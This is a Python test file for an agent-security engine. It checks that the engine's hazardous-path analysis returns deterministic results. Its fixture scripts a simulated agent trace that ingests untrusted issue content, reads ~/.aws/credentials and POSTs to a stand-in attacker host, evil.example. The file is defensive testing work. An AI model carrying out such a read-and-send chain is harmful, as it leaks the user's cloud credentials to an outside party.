"""AA/AB — deterministic Predictive Authority analysis (not agent behaviour prediction)."""

from __future__ import annotations

from varden.models import Action
from varden.predictive_authority.graph import CapabilityGraph, EdgeEvidence, EdgeKind, GraphEdge, GraphNode
from varden.predictive_authority.hazardous import detect_hazardous_paths

from tests.predictive_authority.helpers import fresh_engine, run_step, untrusted_meta
from tests.predictive_authority.horizon_harness import strip_nondeterministic


def _scenario_actions(trace: str) -> list[Action]:
    return [
        Action(
            type="tool_call",
            tool="ingest_issue",
            metadata=untrusted_meta("det-issue"),
            classifiers={"provenance_untrusted": True},
            trace_id=trace,
            tenant_id="det",
        ),
        Action(
            type="filesystem_read",
            tool="open",
            args={"args": ["~/.aws/credentials", "r"]},
            metadata=untrusted_meta(),
            trace_id=trace,
            tenant_id="det",
        ),
        Action(
            type="http_request",
            tool="requests.post",
            method="POST",
            url="https://evil.example/x",
            domain="evil.example",
            metadata=untrusted_meta(),
            trace_id=trace,
            tenant_id="det",
        ),
    ]


def _semantic_result(engine, actions):
    out = []
    for action in actions:
        final, result = run_step(engine, action)
        meta = strip_nondeterministic(result.to_metadata())
        out.append(
            {
                "final": final.action,
                "recommendation": result.recommendation.to_dict() if result.recommendation else None,
                "findings": sorted(
                    (f.pattern, f.path.to_dict()["display"], tuple(f.path.nodes)) for f in result.findings
                ),
                "delta": strip_nondeterministic(result.delta.to_dict()) if result.delta else None,
                "analysis_status": result.analysis_status,
                "safe_conclusion": meta.get("safe_conclusion"),
            }
        )
    return out


def test_aa_deterministic_replay_identical_results():
    """Same state/evidence/action/policy/bounds → identical semantic PA result."""
    results = []
    for i in range(12):
        engine = fresh_engine(mode="enforce", max_depth=3)
        results.append(_semantic_result(engine, _scenario_actions(f"aa-{i}")))
    first = results[0]
    for other in results[1:]:
        assert other == first


def test_ab_insertion_order_determinism():
    """Equivalent graphs built with different insertion order → same hazardous result."""
    def build(order_nodes, order_edges):
        g = CapabilityGraph()
        nodes = {
            "untrusted:src": GraphNode(
                node_id="untrusted:src",
                node_type="untrusted_content",
                label="u",
                metadata={"trust_level": "untrusted"},
            ),
            "cap:credential.aws": GraphNode(
                node_id="cap:credential.aws",
                node_type="credential",
                label="credential.aws",
                metadata={"credential": True},
            ),
            "cap:aws.ec2.modify": GraphNode(
                node_id="cap:aws.ec2.modify",
                node_type="capability",
                label="aws.ec2.modify",
            ),
            "sink:ext": GraphNode(
                node_id="sink:ext",
                node_type="sink",
                label="sink",
                metadata={"external_sink": True},
            ),
        }
        for nid in order_nodes:
            g.add_node(nodes[nid])
        edges = [
            ("untrusted:src", "cap:credential.aws", EdgeKind.FLOWS_TO),
            ("cap:credential.aws", "cap:aws.ec2.modify", EdgeKind.GRANTS),
            ("cap:aws.ec2.modify", "sink:ext", EdgeKind.REACHES),
        ]
        for src, dst, kind in order_edges:
            g.add_edge(GraphEdge(src=src, dst=dst, kind=kind, evidence=EdgeEvidence.OBSERVED))
        findings = detect_hazardous_paths(g, max_depth=3)
        return [
            (f.pattern, f.path.to_dict()["display"], f.path.nodes, f.path.evidence)
            for f in findings
        ]

    orders = [
        (
            ["untrusted:src", "cap:credential.aws", "cap:aws.ec2.modify", "sink:ext"],
            [
                ("untrusted:src", "cap:credential.aws", EdgeKind.FLOWS_TO),
                ("cap:credential.aws", "cap:aws.ec2.modify", EdgeKind.GRANTS),
                ("cap:aws.ec2.modify", "sink:ext", EdgeKind.REACHES),
            ],
        ),
        (
            ["sink:ext", "cap:aws.ec2.modify", "cap:credential.aws", "untrusted:src"],
            [
                ("cap:aws.ec2.modify", "sink:ext", EdgeKind.REACHES),
                ("untrusted:src", "cap:credential.aws", EdgeKind.FLOWS_TO),
                ("cap:credential.aws", "cap:aws.ec2.modify", EdgeKind.GRANTS),
            ],
        ),
        (
            ["cap:credential.aws", "sink:ext", "untrusted:src", "cap:aws.ec2.modify"],
            [
                ("cap:credential.aws", "cap:aws.ec2.modify", EdgeKind.GRANTS),
                ("cap:aws.ec2.modify", "sink:ext", EdgeKind.REACHES),
                ("untrusted:src", "cap:credential.aws", EdgeKind.FLOWS_TO),
            ],
        ),
    ]
    baselines = [build(*o) for o in orders]
    assert all(b == baselines[0] for b in baselines)


def test_aa_serialized_security_result_canonical_excluding_timing():
    engine = fresh_engine(mode="observe", max_depth=3)
    actions = _scenario_actions("aa-ser")
    metas = []
    for action in actions:
        _final, result = run_step(engine, action)
        metas.append(strip_nondeterministic(result.to_metadata()))
    engine2 = fresh_engine(mode="observe", max_depth=3)
    metas2 = []
    for action in _scenario_actions("aa-ser-2"):
        _final, result = run_step(engine2, action)
        metas2.append(strip_nondeterministic(result.to_metadata()))
    assert metas == metas2
